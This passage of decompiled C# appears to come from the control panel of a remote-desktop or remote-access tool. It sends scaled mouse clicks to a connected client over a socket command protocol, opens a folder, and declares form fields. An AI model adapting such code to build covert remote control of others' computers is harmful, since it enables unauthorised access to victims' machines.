					ProjectData.ClearProjectError();
				}
				e.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush, 0f, 0f);
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00009688 File Offset: 0x00007888
		private void C2_MouseUp(object sender, MouseEventArgs e)
		{
			if (this.CheckBox2.Checked)
			{
				Point point = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.P1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.P1.Height)))));
				int value;
				if (e.Button == MouseButtons.Left)
				{
					value = 4;
				}
				if (e.Button == MouseButtons.Right)
				{
					value = 16;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"#",
					ima.Y,
					Conversions.ToString(point.X),
					ima.Y,
					Conversions.ToString(point.Y),
					ima.Y,
					Conversions.ToString(value)
				}));
			}
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00009780 File Offset: 0x00007980
		private void CheckBox4_CheckedChanged(object sender, EventArgs e)
		{
			if (this.CheckBox4.Checked)
			{
				try
				{
					object arg_45_0 = null;
					Type arg_45_1 = typeof(Process);
					string arg_45_2 = "Start";
					object[] array = new object[]
					{
						RuntimeHelpers.GetObjectValue(this.folder)
					};
					object[] arg_45_3 = array;
					string[] arg_45_4 = null;
					Type[] arg_45_5 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(arg_45_0, arg_45_1, arg_45_2, arg_45_3, arg_45_4, arg_45_5, array2, true);
					if (array2[0])
					{
						this.folder = RuntimeHelpers.GetObjectValue(array[0]);
					}
				}
				catch (Exception expr_60)
				{
					ProjectData.SetProjectError(expr_60);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00002942 File Offset: 0x00000B42
		private void ScreenOptionsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Panel1.Visible = true;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00002950 File Offset: 0x00000B50
		private void Timer2_Tick(object sender, EventArgs e)
		{
			this.TextBox1.Visible = false;
			this.Timer2.Stop();
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00002969 File Offset: 0x00000B69
		private void CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (this.CheckBox2.Checked)
			{
				this.TextBox1.Visible = true;
				this.Timer2.Start();
				this.Panel1.Visible = false;
			}
		}

		// Token: 0x0400002A RID: 42
		private static List<WeakReference> __ENCList;

		// Token: 0x0400002C RID: 44
		[AccessedThroughProperty("C1")]
		private ComboBox _C1;

		// Token: 0x0400002D RID: 45
		[AccessedThroughProperty("C2")]
		private ComboBox _C2;

		// Token: 0x0400002E RID: 46
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x0400002F RID: 47
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x04000030 RID: 48
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		// Token: 0x04000031 RID: 49
		[AccessedThroughProperty("C")]
		private NumericUpDown _C;

		// Token: 0x04000032 RID: 50
		[AccessedThroughProperty("CheckBox2")]
		private CheckBox _CheckBox2;

		// Token: 0x04000033 RID: 51
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x04000034 RID: 52
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		// Token: 0x04000035 RID: 53
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x04000036 RID: 54
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000037 RID: 55
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000038 RID: 56
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x04000039 RID: 57
		[AccessedThroughProperty("P1")]
		private PictureBox _P1;

		// Token: 0x0400003A RID: 58
		[AccessedThroughProperty("CheckBox4")]
		private CheckBox _CheckBox4;

		// Token: 0x0400003B RID: 59
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x0400003C RID: 60
		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		// Token: 0x0400003D RID: 61
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x0400003E RID: 62
		[AccessedThroughProperty("SaveAsImageToolStripMenuItem")]
		private ToolStripMenuItem _SaveAsImageToolStripMenuItem;

		// Token: 0x0400003F RID: 63
		[AccessedThroughProperty("ScreenOptionsToolStripMenuItem")]
		private ToolStripMenuItem _ScreenOptionsToolStripMenuItem;

		// Token: 0x04000040 RID: 64
		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		// Token: 0x04000041 RID: 65
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000042 RID: 66
		public Form1 F;

		// Token: 0x04000043 RID: 67
		public int Sock;

		// Token: 0x04000044 RID: 68
		public Size Sz;

		// Token: 0x04000045 RID: 69
		private Point point_2;

		// Token: 0x04000046 RID: 70
		public object v;

		// Token: 0x04000047 RID: 71
		public Client sk;

		// Token: 0x04000048 RID: 72
		public Client osk;

		// Token: 0x04000049 RID: 73
		public object folder;

		// Token: 0x0400004A RID: 74
		public object K;

		// Token: 0x0400004B RID: 75
		private string sev;

		// Token: 0x0400004C RID: 76
		public string siz1;

		// Token: 0x0400004D RID: 77
		private Point op;

		// Token: 0x0400004E RID: 78
		public string siz2;
	}
}
